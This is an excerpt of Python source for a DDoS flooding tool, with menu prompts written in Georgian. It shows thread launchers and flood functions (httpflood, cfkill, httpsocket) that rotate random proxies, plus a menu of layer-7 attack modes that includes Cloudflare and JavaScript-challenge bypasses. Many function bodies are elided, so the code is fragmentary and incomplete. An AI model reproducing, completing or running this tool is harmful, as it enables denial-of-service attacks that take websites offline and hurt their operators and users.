...
def build_threads(mode,thread_num,event,socks_type,ind_rlock):
	if mode == "post":
		...
		for _ in range(thread_num):
			th = threading.Thread(target = httpflood,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()
	elif mode == "jsbypass":
		for _ in range(thread_num):
		...
		for _ in range(thread_num):
			th = threading.Thread(target = cfkill,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()
...
def cfkill(event,socks_type,ind_rlock):
	global ind_dict
	header = GenReqHeader("cfkill")
	proxy = Choice(proxies).strip().split(":")
	add = "?"
	if "?" in path:
		add = "&"
...
def httpflood(event,socks_type,ind_rlock):
	global ind_dict
	header = GenReqHeader("get")
	proxy = Choice(proxies).strip().split(":")
	add = "?"
...
def httpsocket(event,socks_type,ind_rlock):
	global ind_dict
	header = GenReqHeader("httpsocket")
	proxy = Choice(proxies).strip().split(":")
	add = "?"
	if "?" in path:
		add = "&"
...
def main():
	...
	global brute
	global url
	print("> მეთოდები: (L7= GET/HTTPFLOOD/HTTP-SOCKET/Browser/TLS/CFB/CFBUAM/CFKILL/JSBYPASS/DGB/POST/HEAD/SLOW/CHECK)")
	mode = InputOption("> აირჩიეთ რომელიმე მეთოდი (ავტომატურად მითითებულია=TLS) :",["get","tls","jsbypass","httpflood","httpsocket","browser","cfb","cfbuam","cfkill","dgb","post","head","slow","check"],"TLS")
